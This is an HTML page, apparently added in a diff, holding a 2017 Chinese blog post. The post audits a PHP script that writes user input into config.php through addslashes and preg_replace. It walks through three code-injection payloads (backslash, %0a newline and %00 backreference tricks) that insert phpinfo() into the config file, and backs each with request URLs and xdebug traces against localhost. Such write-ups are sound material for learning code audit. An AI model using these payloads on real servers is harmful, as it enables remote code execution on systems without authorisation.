@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      php正则的经典漏洞 | Hello,C 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+    
+
+    <meta name="description" content="p师傅前几天的小密圈的一个问题，这是一个经典的配置文件写入问题漏洞:
+123456&amp;lt;?phpif(!isset($_GET[&amp;apos;option&amp;apos;])) die();$str = addslashes($_GET[&amp;apos;option&amp;apos;]);$file = file_get_contents(&amp;apos;./config.php&amp;apos;);$file = pr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php正则的经典漏洞 | Hello,C">
+<meta property="og:url" content="http://yoursite.com/2017/03/16/php正则的经典漏洞/index.html">
+<meta property="og:site_name" content="Hello,C">
+<meta property="og:description" content="p师傅前几天的小密圈的一个问题，这是一个经典的配置文件写入问题漏洞:
+123456&amp;lt;?phpif(!isset($_GET[&amp;apos;option&amp;apos;])) die();$str = addslashes($_GET[&amp;apos;option&amp;apos;]);$file = file_get_contents(&amp;apos;./config.php&amp;apos;);$file = pr">
+<meta property="og:updated_time" content="2017-03-16T09:09:55.190Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php正则的经典漏洞 | Hello,C">
+<meta name="twitter:description" content="p师傅前几天的小密圈的一个问题，这是一个经典的配置文件写入问题漏洞:
+123456&amp;lt;?phpif(!isset($_GET[&amp;apos;option&amp;apos;])) die();$str = addslashes($_GET[&amp;apos;option&amp;apos;]);$file = file_get_contents(&amp;apos;./config.php&amp;apos;);$file = pr">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Hello,C</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          一个小白的独白！
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/links" title="" class="">友情链接</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/zjwfc?tab=activity" title="Huno on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+
+    <!-- China social icon -->
+    
+    
+      <li class="navigation__item">
+        <a href="https://www.douban.com/" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">douban</span>
+        </a>
+      </li>
+
+      <li class="navigation__item">
+        <a href="http://weibo.com/5664757301/profile?topnav=1&wvr=6&is_all=1" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+ 
+
+
+
+  </ul>
+</nav>
+
+
+
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">php正则的经典漏洞</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-03-16" class="post-meta__date date">2017-03-16</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/php/">php</a>, <a class="tags-link" href="/tags/代码审计/">代码审计</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>p师傅前几天的小密圈的一个问题，这是一个经典的配置文件写入问题漏洞:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(!isset($_GET[&apos;option&apos;])) die();</div><div class="line">$str = addslashes($_GET[&apos;option&apos;]);</div><div class="line">$file = file_get_contents(&apos;./config.php&apos;);</div><div class="line">$file = preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;, &quot;\$option=&apos;$str&apos;;&quot;, $file);</div><div class="line">file_put_contents(&apos;./config.php&apos;, $file);</div></pre></td></tr></table></figure>
+<p>config.php的内容：<a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;test&apos;;</div></pre></td></tr></table></figure></p>
+<p>要求是getshell，这个场景十分的经典，经常用在修改配置文件写入的时候。</p>
+<p>首先说说这几个函数：<br><strong>1、addslashes()</strong><br>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+<pre><code>预定义字符是：
+单引号（&apos;）
+双引号（&quot;）
+反斜杠（\）
+NULL
+</code></pre><p><strong>注释：</strong>默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p>
+<p><strong>2、file_get_contents()</strong><br>file_get_contents() 把整个文件读入一个字符串中。<br>file_get_contents(path,include_path,context,start,max_length) </p>
+<p><strong>3、preg_replace()</strong><br>preg_replace(),执行一个正则表达式的搜索和替换</p>
+<p><strong>4、file_put_contents</strong><br>file_put_contents() 函数把一个字符串写入文件中。<br>file_put_contents(file,data,mode,context)</p>
+<h3 id="0x01-利用反斜线"><a href="#0x01-利用反斜线" class="headerlink" title="0x01 利用反斜线"></a>0x01 利用反斜线</h3><p>输入：\’;phpinfo();//<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=\&apos;;phpinfo();//</div></pre></td></tr></table></figure></p>
+<p>则config.php文件修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;\\&apos;;phpinfo();//&apos;;</div></pre></td></tr></table></figure></p>
+<p>\’经过addslashes()之后变为\\’，随后preg_replace会将两个连续的\合并为一个，也就是将\\’转为\‘，这样我们就成功引入了一个单引号，闭合上文注释下文，中间加入要执行的代码即可。<br>看来是preg_replace函数特性。经测试，该函数会针对反斜线进行转义，即成对出现的两个反斜线合并为一个。<br>这是xdebug分析的跳转：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0006     333912   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">    0.0008     333944     -&gt; addslashes(&apos;\\\&apos;;phpinfo();//&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                           &gt;=&gt; &apos;\\\\\\\&apos;;phpinfo();//&apos;</div><div class="line">                           =&gt; $str = &apos;\\\\\\\&apos;;phpinfo();//&apos; D:\phpstudy\www\index.php:3</div><div class="line">    0.0010     334120     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                           &gt;=&gt; &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos;</div><div class="line">                           =&gt; $file = &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">    0.0015     334544     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;\\\\\\\&apos;;phpinfo();//\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                           &gt;=&gt; &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos;</div><div class="line">                           =&gt; $file = &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">    0.0016     334496     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;\\\\\&apos;;phpinfo();//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                           &gt;=&gt; 35</div><div class="line">                         &gt;=&gt; 1</div><div class="line">    0.0055 zu</div></pre></td></tr></table></figure></p>
+<h3 id="0x02-利用正则匹配缺陷和换行符-0a"><a href="#0x02-利用正则匹配缺陷和换行符-0a" class="headerlink" title="0x02 利用正则匹配缺陷和换行符%0a"></a>0x02 利用正则匹配缺陷和换行符%0a</h3><p>分两次进行请求：<br><strong>1、第一次传入aaa’;phpinfo();%0a//,</strong>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=aaa&apos;;phpinfo();%0a//</div></pre></td></tr></table></figure></p>
+<p>此时config.php文件变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;aaa\&apos;;phpinfo();</div><div class="line">//&apos;;</div></pre></td></tr></table></figure></p>
+<p>调试过程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0005     333944   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">    0.0007     333976     -&gt; addslashes(&apos;aaa\&apos;;phpinfo();\n//&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                           &gt;=&gt; &apos;aaa\\\&apos;;phpinfo();\n//&apos;</div><div class="line">                           =&gt; $str = &apos;aaa\\\&apos;;phpinfo();\n//&apos; D:\phpstudy\www\index.php:3</div><div class="line">    0.0009     334144     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                           &gt;=&gt; &apos;&lt;?php\n$option=\&apos;\&apos;;\n\n&apos;</div><div class="line">                           =&gt; $file = &apos;&lt;?php\n$option=\&apos;\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">    0.0012     334552     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;aaa\\\&apos;;phpinfo();\n//\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                           &gt;=&gt; &apos;&lt;?php\n$option=\&apos;aaa\\\&apos;;phpinfo();\n//\&apos;;\n\n&apos;</div><div class="line">                           =&gt; $file = &apos;&lt;?php\n$option=\&apos;aaa\\\&apos;;phpinfo();\n//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">    0.0014     334488     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;aaa\\\&apos;;phpinfo();\n//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                           &gt;=&gt; 38</div><div class="line">                         &gt;=&gt; 1</div><div class="line">    0.0051 zu</div></pre></td></tr></table></figure></p>
+<p><strong>2、第二次传入随意的字符</strong><br>例如bbb正则代码.*会将匹配到的aaa\替换为bbb<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=bbb</div></pre></td></tr></table></figure></p>
+<p>调试过程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0006     333832   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">0.0008     333864     -&gt; addslashes(&apos;bbb&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                       &gt;=&gt; &apos;bbb&apos;</div><div class="line">                       =&gt; $str = &apos;bbb&apos; D:\phpstudy\www\index.php:3</div><div class="line">0.0011     334016     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                       &gt;=&gt; &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos;</div><div class="line">                       =&gt; $file = &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">0.0022     334424     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;bbb\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                       &gt;=&gt; &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos;</div><div class="line">                       =&gt; $file = &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">0.0024     334400     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                       &gt;=&gt; 37</div><div class="line">                     &gt;=&gt; 1</div><div class="line">0.0067 zu</div></pre></td></tr></table></figure></p>
+<p>此时config.php内容变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;bbb&apos;;phpinfo();</div><div class="line">//&apos;;</div></pre></td></tr></table></figure></p>
+<h3 id="0x03-利用-00"><a href="#0x03-利用-00" class="headerlink" title="0x03 利用%00"></a>0x03 利用%00</h3><p>仍然分为两步：<br><strong>1、第一次传入;phpinfo();</strong>，即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=;phpinfo();</div></pre></td></tr></table></figure></p>
+<p>调试如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0005     333880   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">  0.0007     333912     -&gt; addslashes(&apos;;phpinfo();&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                         &gt;=&gt; &apos;;phpinfo();&apos;</div><div class="line">                         =&gt; $str = &apos;;phpinfo();&apos; D:\phpstudy\www\index.php:3</div><div class="line">  0.0009     334080     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                         &gt;=&gt; &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos;</div><div class="line">                         =&gt; $file = &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">  0.0012     334488     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;;phpinfo();\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                         &gt;=&gt; &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos;</div><div class="line">                         =&gt; $file = &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">  0.0014     334448     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                         &gt;=&gt; 30</div><div class="line">                       &gt;=&gt; 1</div><div class="line">  0.0057 zu</div></pre></td></tr></table></figure></p>
+<p>config.php的内容变化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;;phpinfo();&apos;;</div></pre></td></tr></table></figure></p>
+<p><strong>2、第二次传入%00</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=%00</div></pre></td></tr></table></figure></p>
+<p>%00被addslashes()转为\0，而\0在preg_replace函数中会被替换为“匹配到的全部内容”<br>此时preg_replace要执行的代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;\\0&apos;;&quot;,$file);</div></pre></td></tr></table></figure></p>
+<p>或<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;$0&apos;;&quot;,$file);</div></pre></td></tr></table></figure></p>
+<p>即执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;$option=&apos;;phpinfo();&apos;;&apos;;&quot;,$file);</div></pre></td></tr></table></figure></p>
+<p>调试过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0004     333832   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">  0.0006     333864     -&gt; addslashes(&apos;\000&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                         &gt;=&gt; &apos;\\0&apos;</div><div class="line">                         =&gt; $str = &apos;\\0&apos; D:\phpstudy\www\index.php:3</div><div class="line">  0.0007     334016     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                         &gt;=&gt; &apos;&lt;?php\n$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\n\n&apos;</div><div class="line">                         =&gt; $file = &apos;&lt;?php\n$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">  0.0011     334432     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;\\0\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                         &gt;=&gt; &apos;&lt;?php\n$option=\&apos;$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\&apos;;\n\n&apos;</div><div class="line">                         =&gt; $file = &apos;&lt;?php\n$option=\&apos;$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">  0.0013     334408     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                         &gt;=&gt; 52</div><div class="line">                       &gt;=&gt; 1</div><div class="line">  0.0071 zu</div></pre></td></tr></table></figure></p>
+<p>config.php的变化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;\$option=&apos;;phpinfo();&apos;;&apos;;</div></pre></td></tr></table></figure></p>
+
+  </section>
+
+ 
+  
+
+<section class="post-comments">
+
+    <div class="ds-thread" data-thread-key="2017/03/16/php正则的经典漏洞/"></div>
+
+    <script type="text/javascript">
+      var duoshuoQuery = {short_name:"zjwfc"};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+        || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+    </script> 
+
+</section>
+
+
+</article>
+
+
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2017-2018. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script type="text/javascript">
+		window.onload = function(){
+			var config = {
+				vx: 4,
+				vy:  4,
+				height: 2,
+				width: 2,
+				count: 100,
+				color: "121, 162, 185",
+				stroke: "100,200,180",
+				dist: 6000,
+				e_dist: 20000,
+				max_conn: 10
+			}
+			CanvasParticle(config);
+		}
+</script>
+<script type="text/javascript" src="js/canvas-particle.js"></script>
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+
+<span id="busuanzi_container_page_pv">
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
